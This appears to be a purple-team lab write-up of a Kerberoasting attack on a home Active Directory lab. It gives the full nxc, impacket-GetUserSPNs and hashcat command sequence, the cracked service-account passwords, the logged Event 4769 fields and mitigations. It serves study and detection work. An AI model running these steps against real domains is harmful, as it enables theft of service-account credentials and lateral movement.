# Phase 03: On-Prem Attacks — Attack #1: Kerberoasting

**Technique:** Kerberoasting
**MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
**Privilege required:** Any valid domain user account — no admin access, no special groups
**Tools used:** nxc (NetExec), impacket-GetUserSPNs, hashcat
**Accounts targeted:** svc.http, svc.sql (both had SPNs registered with weak passwords)
**Outcome:** Both service account passwords recovered offline

---

## What Kerberoasting Is

Kerberoasting is not a vulnerability — it abuses a legitimate, intentional feature of Kerberos. Any authenticated domain user can request a Kerberos service ticket for any account with a Service Principal Name (SPN) registered. That ticket is encrypted with the service account's password hash. The attacker captures the ticket, takes it offline, and cracks it with a wordlist. No special permissions. No lockout. No direct interaction with the service account.

The KDC (Key Distribution Center, running on DC01) does not check whether the requesting user has permission to use the target service before issuing the ticket. Permission checking is the service's job, after the fact. This is correct Kerberos behaviour — and the reason the attack works against any domain, regardless of how well-configured the access controls are.

---

## Why This Lab Environment Was Vulnerable

Two service accounts were created with SPNs registered and deliberately weak passwords:

| Account | SPN | Password | Why vulnerable |
|---|---|---|---|
| svc.http | `HTTP/memsrv01.kaveelab.internal` | `Summer2024!` | SPN registered + crackable password |
| svc.sql | `MSSQLSvc/memsrv01.kaveelab.internal:1433` | `Service123!` | SPN registered + crackable password |

`PasswordNeverExpires` was also set on both accounts — a common real-world finding on service accounts, meaning the password has never changed since creation and is unlikely to be rotated.

---

## The Attack — Step by Step

### Step 1 — Credential Verification

Before running any attack tool, verify the credential works and gather target information:

```bash
nxc smb 192.168.112.10 -u john.smith -p 'Password123!' -d kaveelab.internal
```

Output confirmed:
- `[+] kaveelab.internal\john.smith:Password123!` — valid credential
- `signing:True` — SMB signing enforced on DC01, relay attacks blocked
- `SMBv1:None` — SMBv1 disabled, EternalBlue-class attacks not applicable

### Step 2 — DNS Fix (required before Kerberos requests)

The first impacket run enumerated SPNs correctly but captured no hashes. Root cause: impacket's LDAP enumeration (finding SPNs) uses `-dc-ip` directly, but the TGS-REQ (actual ticket request) is a full Kerberos exchange requiring DNS resolution of `kaveelab.internal`. Kali's default DNS pointed at the VMware NAT gateway (`192.168.112.2`), which has no knowledge of `kaveelab.internal`. The Kerberos step failed silently.

Fix applied — DC01 as primary nameserver, gateway as fallback:

```bash
sudo bash -c 'echo "nameserver 192.168.112.10" > /etc/resolv.conf && echo "nameserver 192.168.112.2" >> /etc/resolv.conf'
nslookup kaveelab.internal   # verified: returns 192.168.112.10
```

Lesson: when impacket Kerberos operations fail silently despite correct credentials, DNS is almost always the cause.

### Step 3 — SPN Enumeration and Ticket Capture

```bash
impacket-GetUserSPNs kaveelab.internal/john.smith:'Password123!' \
    -dc-ip 192.168.112.10 \
    -request \
    -outputfile /tmp/kerberoast_hashes.txt
```

Output — SPNs found and tickets captured:

```
ServicePrincipalName                      Name      PasswordLastSet             LastLogon
HTTP/memsrv01                             svc.http  2026-08-18 06:32:55         <never>
HTTP/memsrv01.kaveelab.internal           svc.http  2026-08-18 06:32:55         <never>
MSSQLSvc/memsrv01:1433                    svc.sql   2026-08-18 06:35:59         <never>
MSSQLSvc/memsrv01.kaveelab.internal:1433  svc.sql   2026-08-18 06:35:59         <never>
```

Hash type returned: `$krb5tgs$18$` — AES256-CTS-HMAC-SHA1-96 (Hashcat mode 19700).

Windows Server 2025 enforces AES by default and deprecates RC4. This means `etype 0x17` (RC4) downgrade was not possible — a WS2025 hardening behaviour. AES hashes are slower to crack than RC4 but still vulnerable against weak passwords.

`LastLogon: <never>` on both accounts — a common real-world indicator. Service accounts that are never logged into interactively tend to have stale, long-lived passwords.

### Step 4 — Offline Cracking

**ATTACKER01 environment issue:** hashcat requires an OpenCL, CUDA, or HIP-compatible compute platform. VMware Workstation does not expose GPU hardware acceleration to guest VMs by default — the virtual CPU lacks the hardware features the Intel OpenCL runtime requires to initialise. `clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR` was returned despite `intel-opencl-icd` being installed.

**Resolution — cracked on Windows host machine:** the hash file was copied to the host machine where hashcat has full access to real CPU and GPU hardware. This is actually the realistic attacker workflow — in real engagements, hash files are exfiltrated and cracked on dedicated hardware, not on the machine used for attacking. The attacking VM is for attacking, not cracking.

On Windows host, inside the hashcat directory:

```cmd
.\hashcat.exe -m 19700 hashes.txt passwords.txt
```

Wordlist used — targeted lab wordlist:

```
Summer2024!
Service123!
Password123!
Backup2023!
```

Result:

```
Status: Cracked
Recovered: 2/2 (100.00%) Digests
Time: 1 second
```

Cracked passwords confirmed with `--show`:

```
$krb5tgs$18$svc.http$...:Summer2024!
$krb5tgs$18$svc.sql$...:Service123!
```

---

## What DC01 Logged — Event ID 4769

Four Event 4769 entries generated — two SPNs × two ticket requests per account (short name and FQDN).

Key fields from each event:

| Field | Value | Significance |
|---|---|---|
| Account Name | john.smith | The attacker — not the victim |
| Service Name | svc.http / svc.sql | The account whose hash was captured |
| Ticket Encryption Type | 0x12 (AES256) | No RC4 downgrade — WS2025 default |
| Client Address | 192.168.112.xxx | ATTACKER01's IP — confirmed match |
| Failure Code | 0x0 | Success — ticket issued without rejection |

Event 4769 alone is too noisy for detection — every service ticket request in the domain generates it. Detection requires correlating multiple events from the same source account in a short window.

---

## KQL Detection Rule

Stored at `scripts/kql-kerberoasting.kql`. Tests in Microsoft Sentinel in Phase 07.

Detection logic: multiple Kerberos service ticket requests (Event 4769) from the same non-machine user account, targeting non-machine service accounts, within a 5-minute window. Filters out krbtgt noise and machine account traffic. Covers both AES256 (0x12) and RC4 (0x17) encryption types.

This rule would have generated the following alert for this attack:
- AccountName: john.smith
- SourceIP: 192.168.112.xxx (ATTACKER01)
- RequestCount: 4
- TargetAccounts: ["svc.http", "svc.sql"]

---

## What the Cracked Passwords Enable

- **svc.http and svc.sql passwords → Attack #6 (Silver Ticket).** Silver Ticket forges a Kerberos service ticket using the service account's NT hash. The NT hash is derived directly from the plaintext password recovered here. No further domain interaction needed to forge the ticket.
- Both accounts can now be authenticated against directly — potential lateral movement depending on what those accounts have access to.

Cracked credential values are stored in the private Notion journal only. Not in this repository.

---

## Defence

The attack cannot be prevented without disabling service ticket issuance — which would break Kerberos-based service authentication entirely. Mitigations:

- **Group Managed Service Accounts (gMSAs)** — 120+ character random passwords, automatically rotated by Windows every 30 days. Computationally infeasible to crack. Correct production solution.
- **Fine-Grained Password Policy** on ServiceAccounts OU — enforce 25+ character passwords minimum. Raises the bar without fully eliminating risk.
- **AES enforcement** — already present on WS2025 by default. Prevents RC4 downgrade attacks.
- **Detection** — the KQL rule above. No preventive control stops the ticket request itself.

---

## Purple Team Loop

| Step | Status |
|---|---|
| Attack executed from ATTACKER01 as john.smith | ✅ |
| AES256 TGS hashes captured for svc.http and svc.sql | ✅ |
| Event 4769 confirmed on DC01 — 4 events, ATTACKER01 IP matched | ✅ |
| Hashes cracked offline — Summer2024! and Service123! recovered | ✅ |
| KQL detection rule written | ✅ |
| KQL rule tested in Microsoft Sentinel | ⏳ Phase 07 |
